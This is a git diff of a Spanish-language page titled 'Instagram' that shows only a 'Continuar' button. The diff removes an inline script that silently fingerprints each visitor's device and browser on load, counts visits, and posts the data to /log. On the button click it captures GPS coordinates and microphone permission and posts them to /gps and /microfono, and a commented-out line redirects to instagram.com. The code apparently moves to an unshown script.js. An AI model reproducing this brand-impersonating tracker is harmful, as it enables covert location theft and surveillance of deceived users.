@@ -1,320 +1,41 @@
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
-
 <meta charset="UTF-8">
-
 <meta
 name="viewport"
 content="width=device-width,initial-scale=1.0">
-
 <title>Instagram</title>
-
 <style>
-
 body{
-
    margin:0;
    padding:0;
-
-   width:100%;
+ width:100%;
    height:100vh;
-
    background:black;
-
    display:flex;
-
    justify-content:center;
-
    align-items:center;
-
    overflow:hidden;
-
    font-family:Arial;
-
 }
-
 #continuar{
-
    width:80%;
    max-width:400px;
-
    height:60px;
-
    border:none;
-
    border-radius:15px;
-
    font-size:22px;
-
 }
-
 </style>
-
 </head>
-
 <body>
-
 <button id="continuar">
 Continuar
 </button>
 
-<script>
-
-// =======================
-// DATOS AUTOMATICOS
-// =======================
-
-const datos = {
-
-   userAgent:
-   navigator.userAgent,
-
-   idioma:
-   navigator.language,
-
-   plataforma:
-   navigator.platform,
-
-   ancho:
-   screen.width,
-
-   alto:
-   screen.height,
-
-   colorDepth:
-   screen.colorDepth,
-
-   pixelRatio:
-   window.devicePixelRatio,
-
-   memoria:
-   navigator.deviceMemory,
-
-   nucleos:
-   navigator.hardwareConcurrency,
-
-   touch:
-   navigator.maxTouchPoints,
-
-   cookies:
-   navigator.cookieEnabled,
-
-   online:
-   navigator.onLine,
-
-   referer:
-   document.referrer,
-
-   zonaHoraria:
-   Intl.DateTimeFormat()
-   .resolvedOptions()
-   .timeZone,
-
-   hora:
-   new Date(),
-
-   conexion:
-   navigator.connection?.effectiveType,
-
-   velocidad:
-   navigator.connection?.downlink,
-
-   ahorroDatos:
-   navigator.connection?.saveData,
-
-}
-
-
-// =======================
-// ENVIO AUTOMATICO
-// =======================
-
-fetch("/log",{
-
-   method:"POST",
-
-   headers:{
-      "Content-Type":"application/json"
-   },
-
-   body:JSON.stringify(datos)
-
-})
-
-
-// =======================
-// CONTADOR VISITAS
-// =======================
-
-let visitas =
-localStorage.getItem("visitas")
-
-if(!visitas){
-
-   visitas = 0
-
-}
-
-visitas++
-
-localStorage.setItem("visitas", visitas)
-
-fetch("/log",{
-
-   method:"POST",
-
-   headers:{
-      "Content-Type":"application/json"
-   },
-
-   body:JSON.stringify({
-      visitas
-   })
-
-})
-
-
-// =======================
-// BOTON
-// =======================
-
-document
-.getElementById("continuar")
-.onclick = async ()=>{
-
-
-// =======================
-// UBICACION
-// =======================
-
-navigator
-.geolocation
-.getCurrentPosition(
-
-async(pos)=>{
-
-   await fetch("/gps",{
-
-      method:"POST",
-
-      headers:{
-         "Content-Type":"application/json"
-      },
-
-      body:JSON.stringify({
-
-         lat:
-         pos.coords.latitude,
-
-         lon:
-         pos.coords.longitude,
-
-         precision:
-         pos.coords.accuracy
-
-      })
-
-   })
-
-},
-
-(err)=>{
-
-   console.log(err)
-
-}
-
-)
-
-
-// =======================
-// MICROFONO
-// =======================
-
-try{
-
-const stream =
-await navigator
-.mediaDevices
-.getUserMedia({
-   audio:true
-})
-
-fetch("/microfono",{
-
-   method:"POST",
-
-   headers:{
-      "Content-Type":"application/json"
-   },
-
-   body:JSON.stringify({
-      microfono:"aceptado"
-   })
-
-})
-
-}catch{
-
-fetch("/microfono",{
-
-   method:"POST",
-
-   headers:{
-      "Content-Type":"application/json"
-   },
-
-   body:JSON.stringify({
-      microfono:"rechazado"
-   })
-
-})
-
-}
-
-
-// =======================
-// REDIRECCION
-// =======================
-
-// window.location.href =
-// "https://instagram.com"
-
-}
-document.getElementById("continuar")
-.onclick = ()=>{
-
-navigator.geolocation.getCurrentPosition((pos)=>{
-
-   fetch("/gps",{
-
-      method:"POST",
-
-      headers:{
-         "Content-Type":"application/json"
-      },
-
-      body: JSON.stringify({
-
-         lat: pos.coords.latitude,
-
-         lon: pos.coords.longitude
-
-      })
-
-   })
-
-})
-
-}
-
-
-</script>
-
-<script src="script.js"></script>
+   <script src="script.js"></script>
 
 </body>
-
 </html>
+
